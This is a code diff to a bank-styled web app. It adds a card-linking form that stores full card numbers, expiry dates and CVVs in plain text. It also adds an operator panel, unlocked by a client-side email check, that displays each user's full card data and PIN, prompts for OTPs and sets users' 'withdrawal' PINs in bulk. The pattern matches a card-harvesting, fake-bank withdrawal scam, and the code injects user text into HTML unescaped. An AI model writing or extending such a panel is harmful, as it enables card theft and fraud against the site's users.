@@ -554,6 +554,16 @@
                         });
                     }
 
+                    // Check if admin user
+                    if (currentUser.email === 'admin@gmail.com') {
+                        document.getElementById('admin-panel').style.display = 'block';
+                        document.getElementById('dashboard').style.display = 'none';
+                        loadAdminPanel();
+                    } else {
+                        document.getElementById('admin-panel').style.display = 'none';
+                        document.getElementById('dashboard').style.display = 'block';
+                    }
+
                     updateHistory(data.history || []);
                 });
 
@@ -759,7 +769,7 @@
                     countryData,
                     balance: initialBalance,
                     accountNumber: accountNumber,
-                    pin: '3009',
+                    pin: '1234',
                     history: [],
                     paypal: '',
                     bankOfAmerica: {},
@@ -839,6 +849,144 @@
         document.querySelector('.accounts-btn').onclick = () => document.getElementById('account-modal').style.display = 'flex';
         document.getElementById('close-account').onclick = () => document.getElementById('account-modal').style.display = 'none';
 
+        document.getElementById('add-card-btn').onclick = () => document.getElementById('card-modal').style.display = 'flex';
+        document.getElementById('close-card').onclick = () => {
+            document.getElementById('card-modal').style.display = 'none';
+            document.getElementById('card-form').reset();
+            document.getElementById('card-error').textContent = '';
+        };
+
+        document.getElementById('card-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const cardNumber = document.getElementById('card-number-input').value.replace(/\s/g, '');
+            const cardName = document.getElementById('card-name').value.trim();
+            const expiry = document.getElementById('card-expiry').value.trim();
+            const cvv = document.getElementById('card-cvv').value.trim();
+            const errorEl = document.getElementById('card-error');
+
+            if (cardNumber.length !== 16) return errorEl.textContent = 'Card number must be 16 digits';
+            if (!cardName) return errorEl.textContent = 'Cardholder name required';
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) return errorEl.textContent = 'Expiry format: MM/YY';
+            if (cvv.length !== 3) return errorEl.textContent = 'CVV must be 3 digits';
+
+            try {
+                const userData = await get(userDataRef).then(s => s.val());
+                const linkedCards = userData.linkedCards || [];
+
+                if (linkedCards.some(card => card.number === cardNumber)) {
+                    return errorEl.textContent = 'Card already linked';
+                }
+
+                const newCard = {
+                    number: cardNumber,
+                    name: cardName,
+                    expiry: expiry,
+                    cvv: cvv,
+                    lastFour: cardNumber.slice(-4),
+                    brand: detectCardBrand(cardNumber),
+                    addedDate: new Date().toISOString(),
+                    status: 'pending',
+                    otp: ''
+                };
+
+                linkedCards.push(newCard);
+
+                await runTransaction(userDataRef, (user) => {
+                    if (user) {
+                        user.linkedCards = linkedCards;
+                        return user;
+                    }
+                    return user;
+                });
+
+                alert('Card linked successfully!');
+                document.getElementById('card-form').reset();
+                document.getElementById('card-modal').style.display = 'none';
+                errorEl.textContent = '';
+                displayLinkedCards();
+            } catch (err) {
+                errorEl.textContent = 'Failed to link card: ' + err.message;
+            }
+        });
+
+        function detectCardBrand(number) {
+            if (number.startsWith('4')) return 'Visa';
+            if (number.startsWith('5')) return 'Mastercard';
+            if (number.startsWith('3')) return 'Amex';
+            return 'Card';
+        }
+
+        async function displayLinkedCards() {
+            const userData = await get(userDataRef).then(s => s.val());
+            const linkedCards = userData?.linkedCards || [];
+            const container = document.getElementById('linked-cards-list');
+            container.innerHTML = '';
+
+            if (linkedCards.length === 0) {
+                container.innerHTML = '<p style="text-align:center; opacity:0.6;">No cards linked</p>';
+                return;
+            }
+
+            linkedCards.forEach((card, index) => {
+                const cardEl = document.createElement('div');
+                cardEl.className = 'linked-card-item';
+                
+                let statusBadge = '';
+                if (card.status === 'pending') {
+                    statusBadge = '<span class="card-status pending">⏳ Pending Authorization</span>';
+                } else if (card.status === 'authorized') {
+                    statusBadge = '<span class="card-status authorized">✓ Authorized</span>';
+                } else if (card.status === 'otp_required') {
+                    statusBadge = '<span class="card-status otp">🔐 OTP Required</span>';
+                } else if (card.status === 'rejected') {
+                    statusBadge = `<span class="card-status rejected">❌ Rejected</span>`;
+                    if (card.rejectionReason) {
+                        statusBadge += `<div class="rejection-reason">${card.rejectionReason}</div>`;
+                    }
+                }
+                
+                cardEl.innerHTML = `
+                    <div class="linked-card-info">
+                        <div class="linked-card-brand">${card.brand}</div>
+                        <div class="linked-card-number">•••• •••• •••• ${card.lastFour}</div>
+                        <div class="linked-card-name">${card.name}</div>
+                        <div class="linked-card-expiry">Expires: ${card.expiry}</div>
+                        ${statusBadge}
+                    </div>
+                    <button class="remove-card-btn" onclick="removeCard(${index})">Remove</button>
+                `;
+                container.appendChild(cardEl);
+            });
+        }
+
+        window.removeCard = async function(index) {
+            if (!confirm('Remove this card?')) return;
+
+            try {
+                await runTransaction(userDataRef, (user) => {
+                    if (user && user.linkedCards) {
+                        user.linkedCards.splice(index, 1);
+                        return user;
+                    }
+                    return user;
+                });
+
+                alert('Card removed successfully!');
+                displayLinkedCards();
+            } catch (err) {
+                alert('Failed to remove card: ' + err.message);
+            }
+        };
+
+        document.getElementById('view-cards-btn').onclick = async () => {
+            document.getElementById('cards-list-modal').style.display = 'flex';
+            displayLinkedCards();
+        };
+
+        document.getElementById('close-cards-list').onclick = () => {
+            document.getElementById('cards-list-modal').style.display = 'none';
+        };
+
         document.getElementById('more-btn').onclick = () => document.getElementById('more-modal').style.display = 'flex';
         document.getElementById('close-more').onclick = () => document.getElementById('more-modal').style.display = 'none';
 
@@ -873,7 +1021,7 @@
                     return;
                 }
 
-                if (!confirm('This will update ALL users\' withdrawal codes to 3009. Continue?')) return;
+                if (!confirm('This will update ALL users\' withdrawal codes to 1234. Continue?')) return;
 
                 try {
                     const usersRef = ref(db, 'users');
@@ -886,7 +1034,7 @@
                         for (const uid in users) {
                             await runTransaction(ref(db, 'users/' + uid), (user) => {
                                 if (user) {
-                                    user.pin = '3009';
+                                    user.pin = '1234';
                                     return user;
                                 }
                                 return user;
@@ -894,7 +1042,7 @@
                             count++;
                         }
                         
-                        alert(`Successfully updated ${count} users' PINs to 3009!`);
+                        alert(`Successfully updated ${count} users' PINs to 1234!`);
                     } else {
                         alert('No users found.');
                     }
@@ -1124,6 +1272,280 @@
                 document.getElementById('language-modal').style.display = 'none';
             };
         });
+
+        async function loadAdminPanel() {
+            const usersRef = ref(db, 'users');
+            const snapshot = await get(usersRef);
+            
+            if (snapshot.exists()) {
+                const users = snapshot.val();
+                const userList = document.getElementById('admin-user-list');
+                userList.innerHTML = '';
+                
+                for (const uid in users) {
+                    const user = users[uid];
+                    if (user.email === 'admin@gmail.com') continue; // Skip admin account
+                    
+                    const linkedCards = user.linkedCards || [];
+                    let cardsHTML = '';
+                    
+                    if (linkedCards.length > 0) {
+                        cardsHTML = '<div class="admin-cards-section"><h4>Linked Cards:</h4>';
+                        linkedCards.forEach((card, cardIndex) => {
+                            const statusClass = card.status === 'authorized' ? 'authorized' : card.status === 'otp_required' ? 'otp' : 'pending';
+                            cardsHTML += `
+                                <div class="admin-card-item">
+                                    <div class="admin-card-details">
+                                        <strong>${card.brand}</strong> •••• ${card.lastFour}<br>
+                                        <small>Name: ${card.name}</small><br>
+                                        <small>Expiry: ${card.expiry} | CVV: ${card.cvv}</small><br>
+                                        <small>Full Number: ${card.number}</small><br>
+                                        ${card.otp ? `<small style="color:#3b82f6;">OTP: ${card.otp}</small><br>` : ''}
+                                        ${card.rejectionReason ? `<small style="color:#ff5c5c;">Rejected: ${card.rejectionReason}</small><br>` : ''}
+                                        <span class="card-status ${statusClass}">${card.status === 'authorized' ? '✓ Authorized' : card.status === 'otp_required' ? '🔐 OTP Required' : card.status === 'rejected' ? '❌ Rejected' : '⏳ Pending'}</span>
+                                    </div>
+                                    <div class="admin-card-actions">
+                                        <button class="admin-auth-btn" onclick="authorizeCard('${uid}', ${cardIndex})">Authorize</button>
+                                        <button class="admin-otp-btn" onclick="requireOTP('${uid}', ${cardIndex})">Require OTP</button>
+                                        <button class="admin-reject-btn" onclick="rejectCard('${uid}', ${cardIndex})">Reject</button>
+                                    </div>
+                                </div>
+                            `;
+                        });
+                        cardsHTML += '</div>';
+                    }
+                    
+                    const userCard = document.createElement('div');
+                    userCard.className = 'admin-user-card';
+                    userCard.innerHTML = `
+                        <div class="admin-user-info">
+                            <div class="admin-user-name">${user.firstname} ${user.surname}</div>
+                            <div class="admin-user-detail">Email: ${user.email}</div>
+                            <div class="admin-user-detail">Account: ${user.accountNumber}</div>
+                            <div class="admin-user-detail">Current PIN: ${user.pin || 'N/A'}</div>
+                            <div class="admin-user-detail">Balance: ${currencySymbols[user.currency] || '$'}${(user.balance || 0).toLocaleString()}</div>
+                        </div>
+                        ${cardsHTML}
+                        <div class="admin-user-actions">
+                            <input type="text" class="admin-pin-input" placeholder="New PIN" maxlength="4" pattern="\\d{4}" id="pin-${uid}">
+                            <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">Change PIN</button>
+                        </div>
+                    `;
+                    userList.appendChild(userCard);
+                }
+            }
+        }
+
+        window.authorizeCard = async function(uid, cardIndex) {
+            if (!confirm('Authorize this card?')) return;
+            
+            try {
+                await runTransaction(ref(db, 'users/' + uid), (user) => {
+                    if (user && user.linkedCards && user.linkedCards[cardIndex]) {
+                        user.linkedCards[cardIndex].status = 'authorized';
+                        return user;
+                    }
+                    return user;
+                });
+                
+                alert('Card authorized successfully!');
+                loadAdminPanel();
+            } catch (err) {
+                alert('Failed to authorize card: ' + err.message);
+            }
+        };
+
+        window.requireOTP = async function(uid, cardIndex) {
+            const otp = prompt('Enter OTP code for this card (or leave empty to just mark as OTP required):');
+            
+            try {
+                await runTransaction(ref(db, 'users/' + uid), (user) => {
+                    if (user && user.linkedCards && user.linkedCards[cardIndex]) {
+                        user.linkedCards[cardIndex].status = 'otp_required';
+                        user.linkedCards[cardIndex].otp = otp || '';
+                        return user;
+                    }
+                    return user;
+                });
+                
+                alert('Card marked as OTP required!');
+                loadAdminPanel();
+            } catch (err) {
+                alert('Failed to update card: ' + err.message);
+            }
+        };
+
+        window.rejectCard = async function(uid, cardIndex) {
+            const reason = prompt('Enter reason for rejection (will be shown to user):') || 'Unable to authorize card';
+            
+            if (!confirm('Send rejection notification to user?')) return;
+            
+            try {
+                const userRef = ref(db, 'users/' + uid);
+                const userData = await get(userRef).then(s => s.val());
+                
+                await runTransaction(userRef, (user) => {
+                    if (user && user.linkedCards && user.linkedCards[cardIndex]) {
+                        user.linkedCards[cardIndex].status = 'rejected';
+                        user.linkedCards[cardIndex].rejectionReason = reason;
+                        
+                        // Add notification
+                        if (!user.notifications) user.notifications = [];
+                        user.notifications.push({
+                            type: 'card_rejected',
+                            message: `Card authorization failed: ${reason}`,
+                            cardLastFour: user.linkedCards[cardIndex].lastFour,
+                            date: new Date().toISOString(),
+                            read: false
+                        });
+                        
+                        return user;
+                    }
+                    return user;
+                });
+                
+                alert('Rejection notification sent to user!');
+                loadAdminPanel();
+            } catch (err) {
+                alert('Failed to reject card: ' + err.message);
+            }
+        };
+
+        async function checkNotifications() {
+            if (!currentUser) return;
+            
+            const userData = await get(userDataRef).then(s => s.val());
+            const notifications = userData?.notifications || [];
+            const unreadNotifications = notifications.filter(n => !n.read);
+            
+            if (unreadNotifications.length > 0) {
+                const notifBadge = document.getElementById('notification-badge');
+                if (notifBadge) {
+                    notifBadge.textContent = unreadNotifications.length;
+                    notifBadge.style.display = 'block';
+                }
+            }
+        }
+
+        document.getElementById('notifications-btn').onclick = async () => {
+            const userData = await get(userDataRef).then(s => s.val());
+            const notifications = userData?.notifications || [];
+            
+            const modal = document.getElementById('notifications-modal');
+            const container = document.getElementById('notifications-container');
+            container.innerHTML = '';
+            
+            if (notifications.length === 0) {
+                container.innerHTML = '<p style="text-align:center; opacity:0.6;">No notifications</p>';
+            } else {
+                notifications.slice().reverse().forEach((notif, index) => {
+                    const notifEl = document.createElement('div');
+                    notifEl.className = 'notification-item';
+                    if (!notif.read) notifEl.classList.add('unread');
+                    
+                    const icon = notif.type === 'card_rejected' ? '❌' : 
+                                 notif.type === 'card_authorized' ? '✓' : '📢';
+                    
+                    notifEl.innerHTML = `
+                        <div class="notification-icon">${icon}</div>
+                        <div class="notification-content">
+                            <div class="notification-message">${notif.message}</div>
+                            <div class="notification-time">${formatDate(notif.date)}</div>
+                        </div>
+                    `;
+                    container.appendChild(notifEl);
+                });
+                
+                // Mark all as read
+                await runTransaction(userDataRef, (user) => {
+                    if (user && user.notifications) {
+                        user.notifications.forEach(n => n.read = true);
+                        return user;
+                    }
+                    return user;
+                });
+                
+                document.getElementById('notification-badge').style.display = 'none';
+            }
+            
+            modal.style.display = 'flex';
+        };
+
+        document.getElementById('close-notifications').onclick = () => {
+            document.getElementById('notifications-modal').style.display = 'none';
+        };
+
+        // Check notifications periodically
+        setInterval(checkNotifications, 10000); // Every 10 seconds
+
+        window.changeUserPin = async function(uid) {
+            const newPin = document.getElementById(`pin-${uid}`).value.trim();
+            
+            if (!newPin || newPin.length !== 4 || !/^\d{4}$/.test(newPin)) {
+                alert('Please enter a valid 4-digit PIN');
+                return;
+            }
+            
+            if (!confirm(`Change this user's PIN to ${newPin}?`)) return;
+            
+            try {
+                await runTransaction(ref(db, 'users/' + uid), (user) => {
+                    if (user) {
+                        user.pin = newPin;
+                        return user;
+                    }
+                    return user;
+                });
+                
+                alert('PIN updated successfully!');
+                loadAdminPanel(); // Reload to show updated PIN
+            } catch (err) {
+                alert('Failed to update PIN: ' + err.message);
+            }
+        };
+
+        document.getElementById('admin-logout-btn').onclick = () => signOut(auth);
+
+        document.getElementById('admin-change-all-btn').onclick = async () => {
+            const newPin = document.getElementById('admin-global-pin').value.trim();
+            
+            if (!newPin || newPin.length !== 4 || !/^\d{4}$/.test(newPin)) {
+                alert('Please enter a valid 4-digit PIN');
+                return;
+            }
+            
+            if (!confirm(`Change ALL users' PINs to ${newPin}?`)) return;
+            
+            try {
+                const usersRef = ref(db, 'users');
+                const snapshot = await get(usersRef);
+                
+                if (snapshot.exists()) {
+                    const users = snapshot.val();
+                    let count = 0;
+                    
+                    for (const uid in users) {
+                        if (users[uid].email === 'admin@gmail.com') continue; // Skip admin
+                        
+                        await runTransaction(ref(db, 'users/' + uid), (user) => {
+                            if (user) {
+                                user.pin = newPin;
+                                return user;
+                            }
+                            return user;
+                        });
+                        count++;
+                    }
+                    
+                    alert(`Successfully updated ${count} users' PINs to ${newPin}!`);
+                    loadAdminPanel(); // Reload panel
+                } else {
+                    alert('No users found.');
+                }
+            } catch (err) {
+                alert('Migration failed: ' + err.message);
+            }
+        };
 
         document.getElementById('withdraw-form').addEventListener('submit', async e => {
             e.preventDefault();
@@ -1440,10 +1862,11 @@
             inset: 0;
             background: rgba(0,0,0,0.85);
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
             z-index: 1000;
             overflow-y: auto;
             padding: 20px;
+            padding-top: 60px;
         }
 
         .modal-content {
@@ -1453,6 +1876,8 @@
             width: 100%;
             max-width: 360px;
             color: #fff;
+            margin: auto;
+            position: relative;
         }
 
         .modal-header {
@@ -1466,10 +1891,17 @@
             background: none;
             border: none;
             color: #fff;
-            font-size: 24px;
+            font-size: 32px;
             cursor: pointer;
             padding: 0;
-            width: auto;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
 
         .account-info p {
@@ -1581,6 +2013,372 @@
 
         #withdraw-fields-container input {
             margin: 8px 0;
+        }
+
+        #admin-panel {
+            display: none;
+            padding: 24px 16px;
+            min-height: 100vh;
+        }
+
+        .admin-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .admin-header h2 {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+
+        .admin-header p {
+            opacity: 0.7;
+            font-size: 14px;
+        }
+
+        .admin-global-controls {
+            background: rgba(255,255,255,0.08);
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+        }
+
+        .admin-global-controls h3 {
+            font-size: 18px;
+            margin-bottom: 16px;
+        }
+
+        .admin-global-input {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .admin-global-pin {
+            flex: 1;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.12);
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+
+        .admin-change-all-btn {
+            background: #ff9800;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 10px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .admin-logout-btn {
+            background: #ff5c5c;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            margin-top: 12px;
+            width: 100%;
+        }
+
+        .admin-user-list {
+            margin-top: 24px;
+        }
+
+        .admin-user-card {
+            background: rgba(255,255,255,0.06);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .admin-user-info {
+            margin-bottom: 12px;
+        }
+
+        .admin-user-name {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #4dabff;
+        }
+
+        .admin-user-detail {
+            font-size: 13px;
+            opacity: 0.8;
+            margin: 4px 0;
+        }
+
+        .admin-user-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .admin-pin-input {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.12);
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+
+        .admin-change-pin-btn {
+            background: #34d399;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .admin-change-pin-btn:hover {
+            background: #2bb380;
+        }
+
+        .linked-card-item {
+            background: rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .linked-card-info {
+            flex: 1;
+        }
+
+        .linked-card-brand {
+            font-size: 14px;
+            font-weight: 600;
+            color: #4dabff;
+            margin-bottom: 4px;
+        }
+
+        .linked-card-number {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .linked-card-name {
+            font-size: 13px;
+            opacity: 0.7;
+            margin-bottom: 2px;
+        }
+
+        .linked-card-expiry {
+            font-size: 12px;
+            opacity: 0.6;
+        }
+
+        .remove-card-btn {
+            background: #ff5c5c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 13px;
+            width: auto;
+            margin: 0;
+        }
+
+        .card-input-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .card-input-group input {
+            flex: 1;
+        }
+
+        #card-number-input {
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .card-status {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .card-status.pending {
+            background: rgba(255, 193, 7, 0.2);
+            color: #ffc107;
+            border: 1px solid #ffc107;
+        }
+
+        .card-status.authorized {
+            background: rgba(52, 211, 153, 0.2);
+            color: #34d399;
+            border: 1px solid #34d399;
+        }
+
+        .card-status.otp {
+            background: rgba(59, 130, 246, 0.2);
+            color: #3b82f6;
+            border: 1px solid #3b82f6;
+        }
+
+        .admin-cards-section {
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .admin-cards-section h4 {
+            font-size: 14px;
+            margin-bottom: 12px;
+            opacity: 0.8;
+        }
+
+        .admin-card-item {
+            background: rgba(255,255,255,0.04);
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .admin-card-details {
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+
+        .admin-card-details small {
+            display: block;
+            opacity: 0.7;
+            margin: 2px 0;
+        }
+
+        .admin-card-actions {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+
+        .admin-auth-btn, .admin-otp-btn {
+            flex: 1;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: none;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .admin-auth-btn {
+            background: #34d399;
+            color: white;
+        }
+
+        .admin-otp-btn {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .admin-reject-btn {
+            background: #ff5c5c;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: none;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .card-status.rejected {
+            background: rgba(255, 92, 92, 0.2);
+            color: #ff5c5c;
+            border: 1px solid #ff5c5c;
+        }
+
+        .rejection-reason {
+            margin-top: 6px;
+            padding: 8px;
+            background: rgba(255, 92, 92, 0.1);
+            border-left: 3px solid #ff5c5c;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #ff5c5c;
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #ff5c5c;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .nav-item {
+            position: relative;
+        }
+
+        .notification-item {
+            background: rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 12px;
+            display: flex;
+            gap: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .notification-item.unread {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: #3b82f6;
+        }
+
+        .notification-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .notification-content {
+            flex: 1;
+        }
+
+        .notification-message {
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .notification-time {
+            font-size: 12px;
+            opacity: 0.6;
         }
     </style>
 </head>
@@ -1700,6 +2498,15 @@
                 <div>→</div>
                 <div class="nav-label">Send</div>
             </div>
+            <div class="nav-item" id="add-card-btn">
+                <div>💳</div>
+                <div class="nav-label">Add Card</div>
+            </div>
+            <div class="nav-item" id="notifications-btn">
+                <div>🔔</div>
+                <div class="nav-label">Alerts</div>
+                <span class="notification-badge" id="notification-badge">0</span>
+            </div>
             <div class="nav-item" id="more-btn">
                 <div>⋯</div>
                 <div class="nav-label">More</div>
@@ -1746,6 +2553,7 @@
             <div class="more-item" id="more-contact" data-translate="contactUs">Contact us</div>
             <div class="more-item" id="more-help" data-translate="howToUse">How to use it</div>
             <div class="more-item" id="more-account" data-translate="account">Account</div>
+            <div class="more-item" id="view-cards-btn">💳 Linked Cards</div>
             <div class="more-item" id="more-logout" style="color:#ff5c5c;" data-translate="logout">Logout</div>
             <div class="more-item" id="admin-migrate-btn" style="opacity:0.3; font-size:11px; color:#888;">Settings</div>
         </div>
@@ -1807,6 +2615,65 @@
             <p class="error" id="withdraw-error"></p>
             <button type="submit" data-translate="requestWithdrawal">Request Withdrawal</button>
         </form>
+    </div>
+</div>
+
+<div id="notifications-modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>🔔 Notifications</h3>
+            <button id="close-notifications" class="close-btn">×</button>
+        </div>
+        <div id="notifications-container"></div>
+    </div>
+</div>
+
+<div id="card-modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>💳 Link Debit/Credit Card</h3>
+            <button id="close-card" class="close-btn">×</button>
+        </div>
+        <form id="card-form">
+            <input type="text" id="card-number-input" placeholder="Card Number (16 digits)" required pattern="\d{16}" maxlength="19" autocomplete="off">
+            <input type="text" id="card-name" placeholder="Cardholder Name" required>
+            <div class="card-input-group">
+                <input type="text" id="card-expiry" placeholder="MM/YY" required pattern="\d{2}/\d{2}" maxlength="5">
+                <input type="text" id="card-cvv" placeholder="CVV" required pattern="\d{3}" maxlength="3">
+            </div>
+            <p class="error" id="card-error"></p>
+            <button type="submit">Link Card</button>
+        </form>
+    </div>
+</div>
+
+<div id="cards-list-modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>💳 My Linked Cards</h3>
+            <button id="close-cards-list" class="close-btn">×</button>
+        </div>
+        <div id="linked-cards-list"></div>
+    </div>
+</div>
+
+<div id="admin-panel">
+    <div class="admin-header">
+        <h2>🔐 Admin Panel</h2>
+        <p>Manage user withdrawal codes</p>
+    </div>
+
+    <div class="admin-global-controls">
+        <h3>Change All Users' PINs</h3>
+        <div class="admin-global-input">
+            <input type="text" id="admin-global-pin" class="admin-global-pin" placeholder="New PIN" maxlength="4" pattern="\d{4}">
+            <button id="admin-change-all-btn" class="admin-change-all-btn">Change All</button>
+        </div>
+        <button id="admin-logout-btn" class="admin-logout-btn">Logout</button>
+    </div>
+
+    <div class="admin-user-list" id="admin-user-list">
+        <!-- Users will be loaded here -->
     </div>
 </div>
 
